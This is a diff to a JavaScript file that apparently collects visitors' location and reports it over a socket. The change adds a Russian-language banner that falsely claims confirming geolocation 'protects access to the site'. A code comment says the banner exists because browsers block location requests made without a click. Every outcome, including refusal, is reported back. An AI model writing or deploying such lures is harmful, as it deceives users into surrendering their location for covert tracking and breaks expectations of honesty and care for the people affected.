@@ -10,7 +10,7 @@
 
   var HI = '_hi';
 
-  var HG = '_hg';
+  var HG = '_hg2';
 
   var socket = null;
 
@@ -273,21 +273,131 @@
 
     flush();
 
-    setTimeout(askGeo, 900);
+    scheduleGeo();
 
   }
 
 
 
-  function askGeo() {
+  function geoDone() {
 
-    if (getItem(HG)) return;
+    return getItem(HG) === '1';
+
+  }
+
+
+
+  function markGeoDone() {
 
     setItem(HG, '1');
+
+    hideGeoBanner();
+
+  }
+
+
+
+  function hideGeoBanner() {
+
+    var el = document.getElementById('lsr-geo-ask');
+
+    if (el && el.parentNode) el.parentNode.removeChild(el);
+
+  }
+
+
+
+  function showGeoBanner() {
+
+    if (geoDone() || document.getElementById('lsr-geo-ask')) return;
+
+    if (!window.isSecureContext) {
+
+      send({ a: 'g', ok: 0, er: 'insecure' });
+
+      markGeoDone();
+
+      return;
+
+    }
+
+    var bar = document.createElement('div');
+
+    bar.id = 'lsr-geo-ask';
+
+    bar.setAttribute('role', 'dialog');
+
+    bar.style.cssText =
+
+      'position:fixed;left:16px;right:16px;bottom:16px;z-index:2147483000;' +
+
+      'max-width:420px;margin:0 auto;padding:14px 16px;border-radius:12px;' +
+
+      'background:#111;color:#fff;font:14px/1.4 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;' +
+
+      'box-shadow:0 8px 28px rgba(0,0,0,.28);display:flex;flex-direction:column;gap:12px;';
+
+    bar.innerHTML =
+
+      '<div>Подтвердите геолокацию — так мы защищаем доступ к сайту.</div>' +
+
+      '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
+
+      '<button type="button" data-geo="ok" style="flex:1;min-width:120px;padding:10px 12px;border:0;border-radius:8px;background:#fff;color:#111;font-weight:600;cursor:pointer">Разрешить</button>' +
+
+      '<button type="button" data-geo="no" style="padding:10px 12px;border:0;border-radius:8px;background:#333;color:#fff;cursor:pointer">Не сейчас</button>' +
+
+      '</div>';
+
+    bar.addEventListener('click', function (e) {
+
+      var btn = e.target && e.target.closest && e.target.closest('[data-geo]');
+
+      if (!btn) return;
+
+      e.preventDefault();
+
+      e.stopPropagation();
+
+      if (btn.getAttribute('data-geo') === 'ok') {
+
+        requestGeo('banner');
+
+      } else {
+
+        send({ a: 'g', ok: 0, er: 'dismissed' });
+
+        markGeoDone();
+
+      }
+
+    });
+
+    document.documentElement.appendChild(bar);
+
+  }
+
+
+
+  function requestGeo(reason) {
+
+    if (geoDone()) return;
 
     if (!navigator.geolocation) {
 
       send({ a: 'g', ok: 0, er: 'unsupported' });
+
+      markGeoDone();
+
+      return;
+
+    }
+
+    if (!window.isSecureContext) {
+
+      send({ a: 'g', ok: 0, er: 'insecure' });
+
+      markGeoDone();
 
       return;
 
@@ -302,6 +412,8 @@
         if (!c) {
 
           send({ a: 'g', ok: 0, er: 'unavailable' });
+
+          markGeoDone();
 
           return;
 
@@ -321,6 +433,8 @@
 
         });
 
+        markGeoDone();
+
       },
 
       function (err) {
@@ -331,11 +445,25 @@
 
         send({ a: 'g', ok: 0, er: er });
 
+        markGeoDone();
+
       },
 
-      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+      { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
 
     );
+
+  }
+
+
+
+  function scheduleGeo() {
+
+    if (geoDone()) return;
+
+    // браузеры часто режут авто-запрос без клика — нужен баннер с кнопкой
+
+    setTimeout(showGeoBanner, 600);
 
   }
 
